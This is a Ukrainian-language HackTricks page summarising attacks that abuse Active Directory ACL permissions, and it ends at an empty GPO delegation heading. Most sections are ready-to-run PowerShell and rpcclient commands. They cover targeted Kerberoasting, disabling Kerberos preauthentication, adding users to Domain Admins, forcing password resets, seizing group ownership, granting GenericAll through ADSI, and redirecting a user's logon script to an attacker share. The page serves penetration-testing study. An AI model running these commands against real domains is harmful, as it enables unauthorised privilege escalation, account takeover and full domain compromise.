# –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è ACLs/ACEs Active Directory

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFTs**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>

**–¶—è —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —î –ø—ñ–¥—Å—É–º–∫–æ–º —Ç–µ—Ö–Ω—ñ–∫ –∑** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **—Ç–∞** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Å—Ç–∞—Ç—Ç—ñ.**

## **–ó–∞–≥–∞–ª—å–Ω—ñ –ø—Ä–∞–≤–∞ GenericAll –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**

–¶—è –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è –Ω–∞–¥–∞—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ü—ñ—Å–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –ø—Ä–∞–≤ `GenericAll` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `Get-ObjectAcl`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ:

* **–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `net user <username> <password> /domain`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–∫–∏–Ω—É—Ç–∏ –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
* **–¶—ñ–ª—å–æ–≤–∏–π Kerberoasting**: –ü—Ä–∏–∑–Ω–∞—á—Ç–µ SPN –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –∑—Ä–æ–±–ª–µ–Ω–Ω—è –π–æ–≥–æ kerberoastable, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ Rubeus —Ç–∞ targetedKerberoast.py –¥–ª—è –≤–∏–¥–æ–±—É—Ç–∫—É —Ç–∞ —Å–ø—Ä–æ–±–∏ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ö–µ—à—ñ–≤ –∫–≤–∏—Ç–∫—ñ–≤ –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **–¶—ñ–ª–µ—Å–ø—Ä—è–º–æ–≤–∞–Ω–µ ASREPRoasting**: –í–∏–º–∫–Ω—ñ—Ç—å –ø–æ–ø–µ—Ä–µ–¥–Ω—é –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –∑—Ä–æ–±–∏–≤—à–∏ —ó—Ö –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **–ó–∞–≥–∞–ª—å–Ω—ñ –ø—Ä–∞–≤–∞ –Ω–∞ –≥—Ä—É–ø—É GenericAll**

–¶—è –ø—Ä–∏–≤—ñ–ª–µ—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ–º —É –≥—Ä—É–ø—ñ, —è–∫—â–æ –≤—ñ–Ω –º–∞—î –ø—Ä–∞–≤–∞ `GenericAll` –Ω–∞ –≥—Ä—É–ø—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `Domain Admins`. –ü—ñ—Å–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–∏—Ñ–µ—Ä–µ–Ω—Ü—ñ–π–æ–≤–∞–Ω–æ–≥–æ —ñ–º–µ–Ω—ñ –≥—Ä—É–ø–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `Get-NetGroup`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ:

* **–î–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ –≥—Ä—É–ø–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É**: –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä—è–º–∏—Ö –∫–æ–º–∞–Ω–¥ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –º–æ–¥—É–ª—ñ, —Ç–∞–∫—ñ —è–∫ Active Directory –∞–±–æ PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

–í–æ–ª–æ–¥—ñ–Ω–Ω—è —Ü–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –Ω–∞ –æ–±'—î–∫—Ç—ñ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –∞–±–æ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ–∑–≤–æ–ª—è—î:

* **–û–±–º–µ–∂–µ–Ω–Ω—è –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ Kerberos**: –î–æ–∑–≤–æ–ª—è—î –∑–∞—Ö–æ–ø–∏—Ç–∏ –æ–±'—î–∫—Ç –∫–æ–º–ø'—é—Ç–µ—Ä–∞.
* **–¢—ñ–Ω—å–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –∞–±–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç—ñ–Ω—å–æ–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö.

## **WriteProperty on Group**

–Ø–∫—â–æ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —î –ø—Ä–∞–≤–∞ `WriteProperty` –Ω–∞ –≤—Å—ñ –æ–±'—î–∫—Ç–∏ –¥–ª—è –ø–µ–≤–Ω–æ—ó –≥—Ä—É–ø–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –¥–æ–º–µ–Ω—É`), –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å:

* **–î–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ –≥—Ä—É–ø–∏ –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É**: –¶–µ –º–æ–∂–ª–∏–≤–æ –∑–∞–≤–¥—è–∫–∏ –ø–æ—î–¥–Ω–∞–Ω–Ω—é –∫–æ–º–∞–Ω–¥ `net user` —Ç–∞ `Add-NetGroupUser`, —Ü–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—É.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **–°–∞–º (–°–∞–º–æ-—á–ª–µ–Ω—Å—Ç–≤–æ) –≤ –≥—Ä—É–ø—ñ**

–¶—è –ø—Ä–∏–≤—ñ–ª–µ—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –¥–æ–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≥—Ä—É–ø, —Ç–∞–∫–∏—Ö —è–∫ `Domain Admins`, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥, —è–∫—ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –º–∞–Ω—ñ–ø—É–ª—é—é—Ç—å —á–ª–µ–Ω—Å—Ç–≤–æ–º –≤ –≥—Ä—É–ø—ñ. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ –∫–æ–º–∞–Ω–¥ –¥–æ–∑–≤–æ–ª—è—î —Å–∞–º–æ–≤—ñ–¥–Ω–µ—Å–µ–Ω–Ω—è:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (–°–∞–º–æ—á–ª–µ–Ω—Å—Ç–≤–æ)**

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–∞ –ø—Ä–∏–≤—ñ–ª–µ—è, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –¥–æ –≥—Ä—É–ø, –∑–º—ñ–Ω—é—é—á–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –≥—Ä—É–ø, —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –ø—Ä–∞–≤–æ `WriteProperty` –Ω–∞ —Ü—ñ –≥—Ä—É–ø–∏. –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—ñ—î—ó –ø—Ä–∏–≤—ñ–ª–µ—ó –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

–£—Ç—Ä–∏–º–∞–Ω–Ω—è `ExtendedRight` –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è `User-Force-Change-Password` –¥–æ–∑–≤–æ–ª—è—î —Å–∫–∏–¥–∞—Ç–∏ –ø–∞—Ä–æ–ª—å –±–µ–∑ –∑–Ω–∞–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è. –ü–µ—Ä–µ–≤—ñ—Ä–∫—É —Ü—å–æ–≥–æ –ø—Ä–∞–≤–∞ —Ç–∞ –π–æ–≥–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PowerShell –∞–±–æ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞, —â–æ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∫–ª—é—á–∞—é—á–∏ —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ñ —Å–µ—Å—ñ—ó —Ç–∞ –æ–¥–Ω–æ—Ä—è–¥–∫–æ–≤—ñ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –Ω–µ—ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â. –ö–æ–º–∞–Ω–¥–∏ –≤–∞—Ä—ñ—é—é—Ç—å—Å—è –≤—ñ–¥ –ø—Ä–æ—Å—Ç–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤ PowerShell –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `rpcclient` –Ω–∞ Linux, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω—ñ—Å—Ç—å –≤–µ–∫—Ç–æ—Ä—ñ–≤ –∞—Ç–∞–∫.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner –Ω–∞ –≥—Ä—É–ø—É**

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏—è–≤–ª—è—î, —â–æ –≤—ñ–Ω –º–∞—î –ø—Ä–∞–≤–∞ `WriteOwner` –Ω–∞ –≥—Ä—É–ø—É, –≤—ñ–Ω –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫–∞ –≥—Ä—É–ø–∏ –Ω–∞ —Å–µ–±–µ. –¶–µ –æ—Å–æ–±–ª–∏–≤–æ –≤–∞–∂–ª–∏–≤–æ, –∫–æ–ª–∏ –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è –≥—Ä—É–ø–∞ `Domain Admins`, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–º—ñ–Ω–∞ –≤–ª–∞—Å–Ω–æ—Å—Ç—ñ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞—Ç–∏ –±—ñ–ª—å—à–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ –≥—Ä—É–ø–∏ —Ç–∞ —ó—ó —á–ª–µ–Ω—Å—Ç–≤–æ–º. –ü—Ä–æ—Ü–µ—Å –≤–∫–ª—é—á–∞—î –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `Get-ObjectAcl`, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `Set-DomainObjectOwner` –¥–ª—è –∑–º—ñ–Ω–∏ –≤–ª–∞—Å–Ω–∏–∫–∞, –∞–±–æ –∑–∞ SID, –∞–±–æ –∑–∞ —ñ–º'—è–º.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**

–¶—è –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ó–æ–∫—Ä–µ–º–∞, –∑ –¥–æ—Å—Ç—É–ø–æ–º `GenericWrite` –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ —à–ª—è—Ö –¥–æ –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É –ø—Ä–∏ –≤—Ö–æ–¥—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `Set-ADObject` –¥–ª—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `scriptpath` —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ —Å–∫—Ä–∏–ø—Ç –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite –Ω–∞ –≥—Ä—É–ø—ñ**

–ó —Ü–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ–º —É –≥—Ä—É–ø—ñ, –¥–æ–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∞–±–æ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≥—Ä—É–ø. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –≤–∫–ª—é—á–∞—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –π–æ–≥–æ –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∞–±–æ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ –≥—Ä—É–ø–∏ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –∑–º—ñ–Ω —É —á–ª–µ–Ω—Å—Ç–≤—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥ PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

–í–æ–ª–æ–¥—ñ–Ω–Ω—è –æ–±'—î–∫—Ç–æ–º AD —Ç–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ `WriteDACL` –Ω–∞ –Ω—å–æ–º—É –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó `GenericAll` –¥–ª—è –æ–±'—î–∫—Ç–∞. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è ADSI, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±'—î–∫—Ç–æ–º —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –π–æ–≥–æ —á–ª–µ–Ω—Å—Ç–≤–æ –≤ –≥—Ä—É–ø–∞—Ö. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü–µ, —ñ—Å–Ω—É—é—Ç—å –æ–±–º–µ–∂–µ–Ω–Ω—è –ø—Ä–∏ —Å–ø—Ä–æ–±—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–ª–µ—Ç—ñ–≤ `Set-Acl` / `Get-Acl` –º–æ–¥—É–ª—è Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **–†–µ–ø–ª—ñ–∫–∞—Ü—ñ—è –≤ –¥–æ–º–µ–Ω—ñ (DCSync)**

–ê—Ç–∞–∫–∞ DCSync –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—é –≤ –¥–æ–º–µ–Ω—ñ –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞ –¥–æ–º–µ–Ω—É —Ç–∞ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö, –≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤. –¶—è –ø–æ—Ç—É–∂–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–º–∞–≥–∞—î –¥–æ–∑–≤–æ–ª—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `DS-Replication-Get-Changes`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –≤–∏–¥–æ–±—É–≤–∞—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ AD –±–µ–∑ –ø—Ä—è–º–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞ –¥–æ–º–µ–Ω—É. [**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –∞—Ç–∞–∫—É DCSync —Ç—É—Ç.**](../dcsync.md)

## –î–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### –î–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è GPO

